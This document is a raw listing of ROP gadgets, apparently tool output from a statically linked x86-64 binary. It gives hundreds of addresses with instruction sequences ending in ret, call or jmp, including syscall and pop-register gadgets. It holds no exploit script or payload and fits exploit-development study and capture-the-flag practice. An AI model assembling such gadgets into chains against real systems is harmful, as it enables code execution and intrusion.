0x0000000000496476 : add byte ptr [rax], al ; call 0xffffffffe1495c21
0x0000000000400fcc : add byte ptr [rax], al ; call qword ptr [rbx + 0x10]
0x0000000000406fee : add byte ptr [rax], al ; call qword ptr [rbx]
0x0000000000477239 : add byte ptr [rax], al ; call r14
0x0000000000406efb : add byte ptr [rax], al ; call rax
0x00000000004703ce : add byte ptr [rax], al ; call rbx
0x000000000048a75e : add byte ptr [rax], al ; call rdi
0x0000000000406e35 : add byte ptr [rax], al ; call rdx
0x000000000048990e : add byte ptr [rax], al ; call rsp
0x0000000000497ea6 : add byte ptr [rax], al ; clc ; cli ; jmp qword ptr [rcx]
0x000000000043a584 : add byte ptr [rax], al ; clc ; jg 0x43a588 ; int1 ; mov eax, eax ; ret
0x000000000049c832 : add byte ptr [rax], al ; clc ; mov byte ptr [rax], al ; add byte ptr [rax], cl ; xor ebp, edi ; jmp rdx
0x0000000000497132 : add byte ptr [rax], al ; clc ; xor dword ptr [rax], eax ; add byte ptr [rax], bh ; movsxd rdi, eax ; jmp qword ptr [rbx]
0x000000000043a4b1 : add byte ptr [rax], al ; cmove rax, rcx ; pop rbx ; ret
0x000000000043a479 : add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x000000000041675c : add byte ptr [rax], al ; cmove rax, rdx ; ret
0x0000000000415cb3 : add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000049c576 : add byte ptr [rax], al ; cmp al, 0x86 ; add byte ptr [rax], al ; je 0x49c5a7 ; std ; call rdi
0x000000000049773b : add byte ptr [rax], al ; cmp byte ptr [rax], al ; add byte ptr [rax + 0x29], dl ; cli ; call qword ptr [rdx]
0x0000000000497136 : add byte ptr [rax], al ; cmp byte ptr [rbx - 8], ah ; jmp qword ptr [rbx]
0x0000000000497eba : add byte ptr [rax], al ; cmp byte ptr [rdi], 0 ; add byte ptr [rax], dl ; cli ; jmp qword ptr [rcx]
0x000000000046b37c : add byte ptr [rax], al ; cmp rax, -1 ; cmove rax, rdx ; ret
0x000000000043dc1e : add byte ptr [rax], al ; cmp rdx, qword ptr [rdi + 0x10] ; jae 0x43dc11 ; ret
0x0000000000414147 : add byte ptr [rax], al ; cmp rdx, r8 ; jne 0x414118 ; ret
0x0000000000462384 : add byte ptr [rax], al ; cmp rsi, rdi ; cmovne rax, rdx ; ret
0x000000000049c2d2 : add byte ptr [rax], al ; cwde ; add dword ptr [rax], 0 ; mov al, ch ; std ; jmp qword ptr [rdi]
0x000000000049ae26 : add byte ptr [rax], al ; cwde ; pop rbp ; cld ; jmp qword ptr [rax]
0x0000000000499612 : add byte ptr [rax], al ; fcom dword ptr [rsi] ; add byte ptr [rax + 0xd], cl ; sti ; call qword ptr [rcx]
0x0000000000499912 : add byte ptr [rax], al ; fcomp dword ptr [rcx] ; add al, ch ; sbb bl, bh ; call qword ptr [rax]
0x0000000000497712 : add byte ptr [rax], al ; fdiv dword ptr [rdi] ; add byte ptr [rax], al ; js 0x49774b ; cli ; call qword ptr [rax]
0x000000000049bfda : add byte ptr [rax], al ; hlt ; add al, 0xfd ; call rdx
0x00000000004009c8 : add byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
0x000000000049aa82 : add byte ptr [rax], al ; imul rax, qword ptr [rax], 0 ; mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x000000000049992a : add byte ptr [rax], al ; in al, 0x18 ; sti ; call qword ptr [rdx]
0x0000000000495842 : add byte ptr [rax], al ; in al, dx ; ja 0x495843 ; call qword ptr [rdx]
0x0000000000499926 : add byte ptr [rax], al ; in al, dx ; pop rcx ; add byte ptr [rax], al ; in al, 0x18 ; sti ; call qword ptr [rdx]
0x000000000049ac3b : add byte ptr [rax], al ; insd dword ptr [rdi], dx ; add byte ptr [rax], al ; xor byte ptr [rsi - 4], cl ; jmp rdx
0x0000000000477fab : add byte ptr [rax], al ; ja 0x477fb8 ; sbb eax, eax ; ret
0x000000000040a446 : add byte ptr [rax], al ; je 0x40a451 ; ret
0x00000000004167c0 : add byte ptr [rax], al ; je 0x41678f ; ret
0x00000000004604d9 : add byte ptr [rax], al ; je 0x4604e5 ; ret
0x0000000000477436 : add byte ptr [rax], al ; je 0x477424 ; add rsp, 0x18 ; ret
0x00000000004774c6 : add byte ptr [rax], al ; je 0x4774aa ; ret
0x0000000000477507 : add byte ptr [rax], al ; je 0x477518 ; mov qword ptr [rdi + rsi*8], rdx ; ret
0x0000000000496c5a : add byte ptr [rax], al ; je 0x496c4a ; idiv edi ; ret 2
0x000000000049772a : add byte ptr [rax], al ; je 0x49775b ; cli ; jmp rbx
0x000000000049bcfa : add byte ptr [rax], al ; je 0x49bcf5 ; cld ; call qword ptr [rcx]
0x000000000049c57a : add byte ptr [rax], al ; je 0x49c5a3 ; std ; call rdi
0x0000000000497662 : add byte ptr [rax], al ; jl 0x49768a ; cli ; call rsp
0x000000000041373f : add byte ptr [rax], al ; jmp 0x413709
0x000000000043b581 : add byte ptr [rax], al ; jmp 0x43b413
0x000000000041477e : add byte ptr [rax], al ; jmp rax
0x000000000041044b : add byte ptr [rax], al ; jne 0x41045e ; add rsp, 0x10 ; pop rbx ; ret
0x000000000041e3b2 : add byte ptr [rax], al ; jne 0x41e2c8 ; ret
0x000000000043aacd : add byte ptr [rax], al ; jne 0x43aafd ; add rsp, 0x20 ; pop rbx ; ret
0x000000000043b745 : add byte ptr [rax], al ; jne 0x43b761 ; add rsp, 0x28 ; ret
0x000000000043b975 : add byte ptr [rax], al ; jne 0x43b9c3 ; add rsp, 0x58 ; ret
0x000000000043bbc4 : add byte ptr [rax], al ; jne 0x43bc13 ; add rsp, 0x18 ; ret
0x000000000043bd45 : add byte ptr [rax], al ; jne 0x43bd56 ; add rsp, 0x58 ; ret
0x000000000043c674 : add byte ptr [rax], al ; jne 0x43c68f ; add rsp, 0x28 ; ret
0x000000000044a44d : add byte ptr [rax], al ; jne 0x44a45e ; add rsp, 0x18 ; ret
0x0000000000461e3a : add byte ptr [rax], al ; jne 0x461e8b ; add rsp, 0x58 ; ret
0x0000000000461f81 : add byte ptr [rax], al ; jne 0x461fab ; add rsp, 0x38 ; ret
0x000000000046d28f : add byte ptr [rax], al ; jne 0x46d2cb ; add rsp, 0x38 ; ret
0x000000000046d324 : add byte ptr [rax], al ; jne 0x46d33c ; add rsp, 0x38 ; ret
0x000000000046d434 : add byte ptr [rax], al ; jne 0x46d45c ; add rsp, 0x48 ; ret
0x000000000046d4e8 : add byte ptr [rax], al ; jne 0x46d4fb ; add rsp, 0x20 ; pop rbx ; ret
0x000000000046d5e4 : add byte ptr [rax], al ; jne 0x46d5fc ; add rsp, 0x38 ; ret
0x000000000046d69e : add byte ptr [rax], al ; jne 0x46d6bc ; add rsp, 0x38 ; ret
0x000000000046eeaf : add byte ptr [rax], al ; jne 0x46eef3 ; leave ; ret
0x000000000046f44d : add byte ptr [rax], al ; jne 0x46f46d ; add rsp, 0x38 ; ret
0x000000000046fa7b : add byte ptr [rax], al ; jne 0x46fa8c ; add rsp, 0x38 ; ret
0x000000000046fb5e : add byte ptr [rax], al ; jne 0x46fb7c ; add rsp, 0x38 ; ret
0x0000000000472cc9 : add byte ptr [rax], al ; jne 0x472ce4 ; add rsp, 0x38 ; ret
0x0000000000472e7b : add byte ptr [rax], al ; jne 0x472e95 ; add rsp, 0x30 ; pop rbx ; ret
0x0000000000474c77 : add byte ptr [rax], al ; jne 0x474c8e ; add rsp, 0x28 ; ret
0x00000000004783d2 : add byte ptr [rax], al ; jne 0x4783f5 ; ret
0x00000000004971af : add byte ptr [rax], al ; jo 0x4971af ; call rsp
0x00000000004971aa : add byte ptr [rax], al ; jo 0x4971e9 ; add byte ptr [rax], al ; add byte ptr [rax - 8], dh ; call rsp
0x00000000004974aa : add byte ptr [rax], al ; jo 0x4974ec ; add byte ptr [rax], al ; shr ah, 0xf9 ; jmp qword ptr [rbx]
0x0000000000497b6e : add byte ptr [rax], al ; jo 0x497bb2 ; cli ; jmp qword ptr [rcx]
0x000000000049cf86 : add byte ptr [rax], al ; jo 0x49cf8d ; jmp qword ptr [rdx]
0x0000000000497716 : add byte ptr [rax], al ; js 0x497747 ; cli ; call qword ptr [rax]
0x0000000000497766 : add byte ptr [rax], al ; js 0x497798 ; cli ; call qword ptr [rbx]
0x00000000004981c6 : add byte ptr [rax], al ; js 0x498226 ; cli ; jmp qword ptr [rcx]
0x00000000004981c5 : add byte ptr [rax], al ; js 0x498227 ; cli ; jmp qword ptr [rcx]
0x00000000004982b2 : add byte ptr [rax], al ; js 0x498302 ; add byte ptr [rax], al ; mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x000000000049c746 : add byte ptr [rax], al ; js 0x49c77c ; std ; jmp qword ptr [rdx]
0x000000000043711e : add byte ptr [rax], al ; lea rax, [rdi + 0xa] ; ret
0x000000000043712e : add byte ptr [rax], al ; lea rax, [rdi + 0xb] ; ret
0x000000000043713e : add byte ptr [rax], al ; lea rax, [rdi + 0xc] ; ret
0x000000000043714e : add byte ptr [rax], al ; lea rax, [rdi + 0xd] ; ret
0x000000000043715e : add byte ptr [rax], al ; lea rax, [rdi + 0xe] ; ret
0x000000000043707d : add byte ptr [rax], al ; lea rax, [rdi + 0xf] ; ret
0x000000000043709e : add byte ptr [rax], al ; lea rax, [rdi + 1] ; ret
0x00000000004370ae : add byte ptr [rax], al ; lea rax, [rdi + 2] ; ret
0x00000000004370be : add byte ptr [rax], al ; lea rax, [rdi + 3] ; ret
0x00000000004370ce : add byte ptr [rax], al ; lea rax, [rdi + 4] ; ret
0x00000000004370de : add byte ptr [rax], al ; lea rax, [rdi + 5] ; ret
0x00000000004370ee : add byte ptr [rax], al ; lea rax, [rdi + 6] ; ret
0x000000000043702a : add byte ptr [rax], al ; lea rax, [rdi + 7] ; ret
0x00000000004370fe : add byte ptr [rax], al ; lea rax, [rdi + 8] ; ret
0x000000000043710e : add byte ptr [rax], al ; lea rax, [rdi + 9] ; ret
0x000000000043708e : add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x000000000043ee7e : add byte ptr [rax], al ; lea rax, [rip + 0x263479] ; ret
0x000000000049802a : add byte ptr [rax], al ; lock add byte ptr [rax], al ; rcl byte ptr [rcx - 6], 1 ; call qword ptr [rdx]
0x000000000049ce52 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; pop rsi ; std ; jmp qword ptr [rdx]
0x00000000004992e6 : add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; push rbx ; add byte ptr [rax], al ; push rsp ; cli ; jmp rax
0x000000000049736e : add byte ptr [rax], al ; loopne 0x4973f5 ; stc ; call qword ptr [rax]
0x0000000000497e8e : add byte ptr [rax], al ; loopne 0x497edf ; cli ; jmp qword ptr [rcx]
0x00000000004998fe : add byte ptr [rax], al ; loopne 0x49991f ; sti ; call qword ptr [rbx]
0x0000000000497d5e : add byte ptr [rax], al ; mov al, 0x40 ; cli ; call qword ptr [rbx]
0x000000000049ceee : add byte ptr [rax], al ; mov al, 0x5f ; std ; jmp qword ptr [rcx]
0x000000000049ceea : add byte ptr [rax], al ; mov al, 0x8f ; add byte ptr [rax], al ; mov al, 0x5f ; std ; jmp qword ptr [rcx]
0x0000000000435ffe : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; lea rax, [rdx] ; ret
0x000000000043484e : add byte ptr [rax], al ; mov al, byte ptr [rcx] ; mov byte ptr [rdx], al ; mov rax, rdi ; ret
0x000000000049c2d6 : add byte ptr [rax], al ; mov al, ch ; std ; jmp qword ptr [rdi]
0x000000000049bfc2 : add byte ptr [rax], al ; mov byte ptr [rax + 0x4d80000], al ; std ; jmp qword ptr [rcx]
0x00000000004982b6 : add byte ptr [rax], al ; mov byte ptr [rax - 6], bl ; call qword ptr [rcx]
0x000000000049dac2 : add byte ptr [rax], al ; mov byte ptr [rbx - 0x42b80000], bl ; std ; call qword ptr [rdx]
0x000000000040a4ee : add byte ptr [rax], al ; mov byte ptr [rdi], 0 ; mov rax, rdi ; ret
0x0000000000436aee : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x00000000004364ce : add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x00000000004981c2 : add byte ptr [rax], al ; mov byte ptr [rdx], al ; add byte ptr [rax + 0x57], bh ; cli ; jmp qword ptr [rcx]
0x000000000049aa86 : add byte ptr [rax], al ; mov byte ptr [rsi - 4], al ; jmp qword ptr [rbx]
0x000000000040f5bb : add byte ptr [rax], al ; mov dword ptr [rip + 0x292249], eax ; ret
0x00000000004364de : add byte ptr [rax], al ; mov dx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000415bbe : add byte ptr [rax], al ; mov eax, 0x16 ; ret
0x00000000004993f2 : add byte ptr [rax], al ; mov eax, 0x58000054 ; cmc ; cli ; call rbx
0x0000000000461bde : add byte ptr [rax], al ; mov eax, 0x66 ; syscall ; ret
0x0000000000461bfe : add byte ptr [rax], al ; mov eax, 0x68 ; syscall ; ret
0x0000000000461bee : add byte ptr [rax], al ; mov eax, 0x6b ; syscall ; ret
0x0000000000461c0e : add byte ptr [rax], al ; mov eax, 0x6c ; syscall ; ret
0x00000000004947f2 : add byte ptr [rax], al ; mov eax, 0xb8000008 ; and al, 0xf7 ; call rsp
0x00000000004981f2 : add byte ptr [rax], al ; mov eax, 0xb8000042 ; push rdi ; cli ; jmp qword ptr [rdi]
0x0000000000415bd6 : add byte ptr [rax], al ; mov eax, 0xc ; pop rbx ; ret
0x0000000000409ab9 : add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000046f0eb : add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000046f2fc : add byte ptr [rax], al ; mov eax, 2 ; ret
0x000000000040e9ee : add byte ptr [rax], al ; mov eax, dword ptr [rdi + 0x10] ; sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000047984e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479869 ; ret
0x0000000000479a7e : add byte ptr [rax], al ; mov eax, dword ptr [rdi] ; test eax, eax ; jne 0x479a99 ; ret
0x000000000043bcc5 : add byte ptr [rax], al ; mov eax, dword ptr [rsp] ; jmp 0x43bc6c
0x0000000000407f1c : add byte ptr [rax], al ; mov eax, ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000455d09 : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000046a10f : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; pop rbp ; ret
0x0000000000455fb7 : add byte ptr [rax], al ; mov eax, edx ; pop rbx ; ret
0x0000000000454091 : add byte ptr [rax], al ; mov eax, edx ; ret
0x000000000043650e : add byte ptr [rax], al ; mov ecx, dword ptr [rsi] ; mov byte ptr [rdi + 4], dh ; mov dword ptr [rdi], ecx ; ret
0x0000000000477234 : add byte ptr [rax], al ; mov edi, 1 ; call r14
0x000000000047725c : add byte ptr [rax], al ; mov edi, 1 ; call rax
0x00000000004273ae : add byte ptr [rax], al ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x0000000000427ace : add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000049bcf6 : add byte ptr [rax], al ; mov esp, 0x7400007d ; cld ; call qword ptr [rcx]
0x0000000000499f92 : add byte ptr [rax], al ; mov esp, gs ; sti ; call rax
0x000000000046f9f8 : add byte ptr [rax], al ; mov qword ptr [rax], rdx ; pop rbx ; ret
0x000000000046d230 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rax ; pop rdx ; pop rbx ; ret
0x0000000000472d42 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x18], rax ; pop rbx ; ret
0x0000000000472df6 : add byte ptr [rax], al ; mov qword ptr [rbx + 0x20], rax ; pop rbx ; ret
0x000000000043dc2e : add byte ptr [rax], al ; mov qword ptr [rdi + 0x20], rsi ; ret
0x00000000004671e4 : add byte ptr [rax], al ; mov qword ptr [rdi + 0x308], rax ; ret
0x000000000040fa76 : add byte ptr [rax], al ; mov qword ptr [rdi + 0x60], rcx ; ret
0x000000000047755e : add byte ptr [rax], al ; mov qword ptr [rdi + 0x98], rsi ; ret
0x000000000046f108 : add byte ptr [rax], al ; mov qword ptr [rdi], rsi ; ret
0x000000000040f60b : add byte ptr [rax], al ; mov qword ptr [rip + 0x2921cc], rax ; ret
0x000000000040f5db : add byte ptr [rax], al ; mov qword ptr [rip + 0x292204], rax ; ret
0x000000000040df5e : add byte ptr [rax], al ; mov rax, -1 ; ret
0x00000000004610ce : add byte ptr [rax], al ; mov rax, 1 ; ret
0x00000000004610de : add byte ptr [rax], al ; mov rax, 2 ; ret
0x00000000004610ee : add byte ptr [rax], al ; mov rax, 3 ; ret
0x00000000004610fe : add byte ptr [rax], al ; mov rax, 4 ; ret
0x000000000046110e : add byte ptr [rax], al ; mov rax, 5 ; ret
0x000000000046111e : add byte ptr [rax], al ; mov rax, 6 ; ret
0x000000000046112e : add byte ptr [rax], al ; mov rax, 7 ; ret
0x0000000000468733 : add byte ptr [rax], al ; mov rax, qword ptr [r15 + 0x10] ; add rax, qword ptr [r14] ; call rax
0x000000000040960e : add byte ptr [rax], al ; mov rax, qword ptr [rax + 0x20] ; jmp rax
0x000000000046d0ee : add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x000000000045e80e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x48] ; mov eax, dword ptr [rax + 0x4c] ; ret
0x000000000040ecfe : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x00000000004774de : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x90] ; ret
0x000000000047756e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa0] ; ret
0x00000000004775ce : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xa8] ; ret
0x00000000004775be : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb0] ; ret
0x000000000047757e : add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0xb8] ; ret
0x0000000000447cfe : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x25c171] ; ret
0x00000000004403ee : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x264531] ; ret
0x000000000040ecde : add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x292439] ; ret
0x00000000004752ae : add byte ptr [rax], al ; mov rax, qword ptr [rsi + 0xa8] ; ret
0x000000000046b5cf : add byte ptr [rax], al ; mov rax, r12 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004602fe : add byte ptr [rax], al ; mov rax, r8 ; vzeroupper ; ret
0x000000000040bb34 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004776d8 : add byte ptr [rax], al ; mov rax, rbp ; pop rbx ; pop rbp ; ret
0x000000000040bf42 : add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000040ed0e : add byte ptr [rax], al ; mov rax, rdi ; ret
0x00000000004392cf : add byte ptr [rax], al ; mov rcx, rdx ; rep movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000406f21 : add byte ptr [rax], al ; mov rdi, qword ptr [rax + 0x20] ; call rdx
0x000000000045c1e7 : add byte ptr [rax], al ; mov rdi, rbx ; call rax
0x000000000042790e : add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x0000000000477f4e : add byte ptr [rax], al ; mov rsi, r14 ; mov rdi, r12 ; call r15
0x000000000049684a : add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; sal edi, 1 ; call qword ptr [rdx]
0x0000000000475365 : add byte ptr [rax], al ; movsxd rax, dword ptr [r15 + rax*4] ; add rax, r15 ; jmp rax
0x000000000045c41a : add byte ptr [rax], al ; movsxd rax, dword ptr [rcx + rax*4] ; add rax, rcx ; jmp rax
0x00000000004498ae : add byte ptr [rax], al ; movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x000000000040a90e : add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000043a4be : add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x000000000042753e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000427c1e : add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x0000000000427bae : add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x000000000049cf82 : add byte ptr [rax], al ; nop ; add byte ptr [rax], al ; jo 0x49cf91 ; jmp qword ptr [rdx]
0x0000000000400b2f : add byte ptr [rax], al ; nop ; leave ; ret
0x000000000043db59 : add byte ptr [rax], al ; nop dword ptr [rax + rax] ; ret
0x00000000004057ea : add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x0000000000496846 : add byte ptr [rax], al ; or al, 0x29 ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; sal edi, 1 ; call qword ptr [rdx]
0x000000000049c742 : add byte ptr [rax], al ; or byte ptr [rax + 0x2d780000], cl ; std ; jmp qword ptr [rdx]
0x000000000049c836 : add byte ptr [rax], al ; or byte ptr [rcx], dh ; std ; jmp rdx
0x0000000000498a92 : add byte ptr [rax], al ; pop rax ; add byte ptr [r8], al ; call 0x1149853e
0x00000000004993f6 : add byte ptr [rax], al ; pop rax ; cmc ; cli ; call rbx
0x0000000000498266 : add byte ptr [rax], al ; pop rax ; pop rax ; cli ; call qword ptr [rax]
0x0000000000499e66 : add byte ptr [rax], al ; pop rax ; ret 0xfffb
0x0000000000497392 : add byte ptr [rax], al ; pop rax ; xor al, 0 ; add byte ptr [rax - 0x66], ch ; stc ; call qword ptr [rax]
0x000000000043c85e : add byte ptr [rax], al ; pop rbp ; pop r12 ; jmp rax
0x0000000000400a06 : add byte ptr [rax], al ; pop rbp ; ret
0x000000000045403b : add byte ptr [rax], al ; pop rbx ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x000000000041474e : add byte ptr [rax], al ; pop rbx ; mov rax, rdx ; pop rbp ; pop r12 ; ret
0x0000000000447e5a : add byte ptr [rax], al ; pop rbx ; pop r12 ; ret
0x000000000046ffda : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x0000000000401485 : add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000407e5a : add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000400d36 : add byte ptr [rax], al ; pop rbx ; ret
0x000000000049dc3b : add byte ptr [rax], al ; popfq ; add byte ptr [rax], al ; ret 0xfffd
0x0000000000497ea2 : add byte ptr [rax], al ; push -0x7ffffc1 ; cli ; jmp qword ptr [rcx]
0x00000000004984a2 : add byte ptr [rax], al ; push -6 ; jmp qword ptr [rdx]
0x000000000049827e : add byte ptr [rax], al ; push rax ; pop rax ; cli ; call qword ptr [rdx]
0x000000000049773e : add byte ptr [rax], al ; push rax ; sub edx, edi ; call qword ptr [rdx]
0x0000000000499582 : add byte ptr [rax], al ; push rsi ; add byte ptr [rax], al ; sbb byte ptr [rax], cl ; sti ; call qword ptr [rdx]
0x00000000004992ea : add byte ptr [rax], al ; push rsp ; cli ; jmp rax
0x00000000004976da : add byte ptr [rax], al ; push rsp ; sub dl, bh ; call qword ptr [rdx]
0x000000000049bfd6 : add byte ptr [rax], al ; pushfq ; add byte ptr [rax], 0 ; hlt ; add al, 0xfd ; call rdx
0x0000000000497332 : add byte ptr [rax], al ; pushfq ; cmp edi, ecx ; jmp qword ptr [rsi]
0x000000000049802e : add byte ptr [rax], al ; rcl byte ptr [rcx - 6], 1 ; call qword ptr [rdx]
0x000000000049ac9e : add byte ptr [rax], al ; rcl byte ptr [rdi - 4], 1 ; jmp qword ptr [rbx]
0x00000000004998fa : add byte ptr [rax], al ; rcr byte ptr [rcx], 0 ; loopne 0x499923 ; sti ; call qword ptr [rbx]
0x00000000004009ce : add byte ptr [rax], al ; ret
0x0000000000480ae6 : add byte ptr [rax], al ; ret 0
0x0000000000487a5e : add byte ptr [rax], al ; ret 0x10
0x000000000048972e : add byte ptr [rax], al ; ret 0x1d4
0x0000000000489ec6 : add byte ptr [rax], al ; ret 0x1d5
0x0000000000488736 : add byte ptr [rax], al ; ret 0x24
0x0000000000488c26 : add byte ptr [rax], al ; ret 0x33
0x000000000048725e : add byte ptr [rax], al ; ret 0xa
0x000000000048765e : add byte ptr [rax], al ; ret 0xd
0x000000000049dc3e : add byte ptr [rax], al ; ret 0xfffd
0x000000000048ab02 : add byte ptr [rax], al ; ret 1
0x000000000048ad02 : add byte ptr [rax], al ; ret 2
0x000000000048af02 : add byte ptr [rax], al ; ret 3
0x000000000048b102 : add byte ptr [rax], al ; ret 4
0x000000000048b302 : add byte ptr [rax], al ; ret 5
0x0000000000486e06 : add byte ptr [rax], al ; ret 6
0x000000000048b702 : add byte ptr [rax], al ; ret 7
0x000000000048b902 : add byte ptr [rax], al ; ret 8
0x000000000048bb02 : add byte ptr [rax], al ; ret 9
0x000000000048b0fe : add byte ptr [rax], al ; rol byte ptr [rax + rax], 0 ; ret 4
0x0000000000487506 : add byte ptr [rax], al ; ror byte ptr [rax + rax], 0 ; ret
0x000000000049945e : add byte ptr [rax], al ; sar bl, 1 ; cli ; call rsp
0x0000000000499586 : add byte ptr [rax], al ; sbb byte ptr [rax], cl ; sti ; call qword ptr [rdx]
0x00000000004974ae : add byte ptr [rax], al ; shr ah, 0xf9 ; jmp qword ptr [rbx]
0x00000000004134fc : add byte ptr [rax], al ; shr ecx, 3 ; rep stosq qword ptr [rdi], rax ; pop rbx ; ret
0x0000000000498e12 : add byte ptr [rax], al ; sub al, 0xbd ; cli ; jmp qword ptr [rdx]
0x0000000000497762 : add byte ptr [rax], al ; sub byte ptr [rax], bh ; add byte ptr [rax], al ; js 0x49779c ; cli ; call qword ptr [rbx]
0x0000000000498262 : add byte ptr [rax], al ; sub byte ptr [rbx], al ; add byte ptr [rax + 0x58], bl ; cli ; call qword ptr [rax]
0x0000000000499262 : add byte ptr [rax], al ; sub byte ptr [rbx], dl ; add byte ptr [rax], ch ; cli ; call qword ptr [rdx]
0x0000000000498166 : add byte ptr [rax], al ; sub byte ptr [rdi - 6], dl ; call qword ptr [rcx]
0x0000000000498162 : add byte ptr [rax], al ; sub byte ptr [rdx], al ; add byte ptr [rax], ch ; push rdi ; cli ; call qword ptr [rcx]
0x0000000000499266 : add byte ptr [rax], al ; sub dl, dh ; cli ; call qword ptr [rdx]
0x000000000041f2fc : add byte ptr [rax], al ; sub eax, ecx ; ret
0x000000000040e0a6 : add byte ptr [rax], al ; sub r8, rcx ; lea eax, [r8 - 1] ; ret
0x0000000000438e11 : add byte ptr [rax], al ; sub rax, rdx ; ret
0x000000000043d9f5 : add byte ptr [rax], al ; syscall ; pop rdx ; pop rsi ; ret
0x0000000000461643 : add byte ptr [rax], al ; syscall ; ret
0x000000000040df24 : add byte ptr [rax], al ; test byte ptr [rbx], 0x80 ; jne 0x40df58 ; pop rbx ; ret
0x000000000043d899 : add byte ptr [rax], al ; test eax, eax ; cmove eax, edx ; ret
0x0000000000400409 : add byte ptr [rax], al ; test rax, rax ; je 0x400419 ; call rax
0x000000000040c04e : add byte ptr [rax], al ; test rdx, rdx ; jne 0x40c069 ; xor eax, eax ; ret
0x000000000047aae6 : add byte ptr [rax], al ; test rdx, rdx ; jne 0x47aaf8 ; ret
0x000000000041dbfe : add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x0000000000497b6a : add byte ptr [rax], al ; xor byte ptr [rax + rax], bh ; add byte ptr [rax + 0x3b], dh ; cli ; jmp qword ptr [rcx]
0x000000000049736a : add byte ptr [rax], al ; xor byte ptr [rax + rax], dh ; add al, ah ; jle 0x497375 ; call qword ptr [rax]
0x000000000049b07e : add byte ptr [rax], al ; xor byte ptr [rbx - 4], ch ; jmp qword ptr [rcx]
0x000000000049ac3e : add byte ptr [rax], al ; xor byte ptr [rsi - 4], cl ; jmp rdx
0x0000000000414ef4 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 0x18 ; ret
0x000000000044b1b7 : add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x0000000000407203 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004776e5 : add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; ret
0x000000000040dece : add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041db4a : add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x0000000000447a36 : add byte ptr [rax], al ; xor r9d, r9d ; call r15
0x0000000000436ece : add byte ptr [rax], al ; xor rax, rax ; ret
0x000000000049773c : add byte ptr [rax], bh ; add byte ptr [rax], al ; push rax ; sub edx, edi ; call qword ptr [rdx]
0x0000000000497137 : add byte ptr [rax], bh ; movsxd rdi, eax ; jmp qword ptr [rbx]
0x0000000000499587 : add byte ptr [rax], bl ; or bl, bh ; call qword ptr [rdx]
0x0000000000494947 : add byte ptr [rax], bl ; sub edi, esi ; call qword ptr [rax]
0x0000000000498263 : add byte ptr [rax], ch ; add byte ptr [r8], al ; pop rax ; pop rax ; cli ; call qword ptr [rax]
0x0000000000498163 : add byte ptr [rax], ch ; add byte ptr [rax], al ; sub byte ptr [rdi - 6], dl ; call qword ptr [rcx]
